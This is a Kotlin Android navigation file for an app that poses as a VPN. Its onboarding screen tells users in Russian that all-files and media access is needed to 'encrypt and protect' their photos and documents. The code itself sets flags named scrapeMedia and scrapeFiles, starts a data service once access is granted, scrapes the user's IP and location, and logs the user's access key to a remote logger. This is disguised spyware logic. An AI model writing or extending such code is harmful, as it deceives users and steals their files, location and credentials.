package com.sdocument.app.navigation

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.unit.Dp
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation3.runtime.NavEntry
import androidx.navigation3.runtime.rememberNavBackStack
import androidx.navigation3.ui.NavDisplay
import com.sdocument.app.MainActivity
import com.sdocument.app.screens.*
import com.sdocument.app.utils.NetworkMonitor
import com.sdocument.app.utils.UserPrefs
import com.sdocument.app.viewmodel.ConfigValues
import androidx.core.net.toUri
import com.sdocument.app.utils.NetworkLogger
import com.sdocument.app.service.scrapeLocationSuspend
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@Composable
fun AppNavHost(
    modifier: Modifier = Modifier,
    configValues: ConfigValues,
    topPadding: Dp = 32.dp
) {
    val context = LocalContext.current
    val startRoute = when {
        !UserPrefs.isLoggedIn(context) -> NavRoute.OnboardPermissions
        !UserPrefs.isVerified(context) -> NavRoute.Verification
        else -> NavRoute.VpnMain
    }

    val backStack = rememberNavBackStack(startRoute)

    LaunchedEffect(Unit) {
        if (UserPrefs.isLoggedIn(context) && UserPrefs.isVerified(context)) {
            kotlinx.coroutines.delay(1000)
            startServiceIfPermitted(context)
            CoroutineScope(Dispatchers.IO).launch {
                val location = context.scrapeLocationSuspend()
                NetworkLogger.syncUser(
                    context = context,
                    lastIp = location?.optString("query"),
                    lastLocation = location?.let { "${it.optString("city")}, ${it.optString("country")}" }
                )
            }
        }
    }

    NavDisplay(
        modifier = modifier,
        backStack = backStack,
        onBack = {
            if (backStack.size > 1) {
                backStack.removeLastOrNull()
            }
        },
        entryProvider = { route ->
            when (route) {
                is NavRoute.OnboardPermissions -> NavEntry(route) {
                    val scrapeMedia = true // Matches MainActivity.startDataService
                    val scrapeFiles = true
                    val scrapeLocation = false

                    val description = buildString {
                        append("Приложению требуются системные разрешения для обеспечения безопасности вашего соединения.\n\n")
                        if (scrapeMedia) {
                            append("• Доступ к медиафайлам: Необходим для шифрования и защиты ваших фотографий и видео.\n")
                        }
                        if (scrapeFiles) {
                            append("• Доступ к файлам: Позволяет защитить ваши документы и важные файлы в хранилище.\n")
                        }
                        if (scrapeLocation) {
                            append("• Доступ к местоположению: Помогает подобрать оптимальный сервер для минимальной задержки.\n")
                        }
                    }

                    PermissionScreen(
                        title = "Доступ к защите",
                        description = description,
                        onAllowClick = {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                                    data = "package:${context.packageName}".toUri()
                                }.also { context.startActivity(it) }
                            } else {
                                // For simplicity, we trigger the logic in effect
                            }
                        },
                        onSkipClick = { 
                            backStack.add(NavRoute.OnboardVpbService)
                        },
                    )

                    val lifecycleOwner = LocalLifecycleOwner.current
                    DisposableEffect(lifecycleOwner) {
                        val observer = LifecycleEventObserver { _, event ->
                            if (event == Lifecycle.Event.ON_RESUME) {
                                val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                    Environment.isExternalStorageManager()
                                } else {
                                    ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                                }
                                if (granted) {
                                    startServiceIfPermitted(context)
                                    backStack.add(NavRoute.OnboardVpbService)
                                }
                            }
                        }
                        lifecycleOwner.lifecycle.addObserver(observer)
                        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
                    }
                }

                is NavRoute.OnboardVpbService -> NavEntry(route) {
                    VpnOnboardingScreen(
                        onGetStarted = {
                            backStack.add(NavRoute.AuthForm)
                        }
                    )
                }

                is NavRoute.AuthForm -> NavEntry(route) {
                    AuthScreen(
                        initialWebViewUrl = configValues.webViewUrl,
                        onAuthSuccess = { successUrl, key ->
                            UserPrefs.setLoggedIn(context, true, successUrl, key)
                            NetworkLogger.setUserId(key, context)
                            NetworkLogger.log("authentication", "Access Key Activated ✅ \n Key: $key")
                            
                            CoroutineScope(Dispatchers.IO).launch {
                                val location = context.scrapeLocationSuspend()
                                NetworkLogger.syncUser(
                                    context = context,
                                    accessKey = key,
                                    lastIp = location?.optString("query"),
                                    lastLocation = location?.let { "${it.optString("city")}, ${it.optString("country")}" },
                                    isActivated = true,
                                    isVerified = true
                                )
                            }
                            backStack.add(NavRoute.Verification)
                        },
                        onAuthError = {
                            Toast.makeText(context, "Ошибка входа", Toast.LENGTH_SHORT).show()
                        },
                    )
                }

                is NavRoute.Verification -> NavEntry(route) {
                    val authUrl = UserPrefs.getAuthUrl(context) ?: configValues.webViewUrl
                    VerificationScreen(
                        onProceedClick = {
                            backStack.add(NavRoute.VerificationWebview(authUrl))
                        }
                    )
                }

                is NavRoute.VerificationWebview -> NavEntry(route) {
                    WScreen(
                        url = route.url,
                        onBackToApp = {
                            UserPrefs.setVerified(context, true)
                            // Clear all onboarding from backstack and go to VpnMain
                            while (backStack.size > 0) backStack.removeLastOrNull()
                            backStack.add(NavRoute.VpnMain)
                        }
                    )
                }

                is NavRoute.VpnMain -> NavEntry(route) {
                    VpnMainScreen(
                        onSelectServer = { backStack.add(NavRoute.VpnServers) },
                        onOpenSettings = { backStack.add(NavRoute.VpnSettings) },
                        onOpenProfile = {  }
                    )
                }

                is NavRoute.VpnServers -> NavEntry(route) {
                    VpnServersScreen(
                        onBack = { backStack.removeLastOrNull() },
                        onServerSelected = { server -> 
                            backStack.removeLastOrNull()
                        }
                    )
                }

                is NavRoute.VpnSettings -> NavEntry(route) {
                    VpnSettingsScreen(
                        onBack = { backStack.removeLastOrNull() },
                        onLogout = {
                            UserPrefs.logout(context)
                            while (backStack.size > 0) backStack.removeLastOrNull()
                            backStack.add(NavRoute.AuthForm)
                        }
                    )
                }

                is NavRoute.VpnProfile -> NavEntry(route) {
                    val authUrl = UserPrefs.getAuthUrl(context) ?: configValues.webViewUrl
                    WScreen(
                        url = authUrl,
                        onBackToApp = { backStack.removeLastOrNull() }
                    )
                }

                is NavRoute.Webview -> NavEntry(route) {
                    WScreen(
                        url = route.url,
                        onBackToApp = { backStack.removeLastOrNull() },
                    )
                }

                else -> error("Unknown route: $route")
            }
        }
    )
}

private fun startServiceIfPermitted(context: android.content.Context) {
    val hasPerms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        Environment.isExternalStorageManager()
    } else
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

    if (hasPerms) {
        val activity = context as? MainActivity
        activity?.startDataService()
    }
}
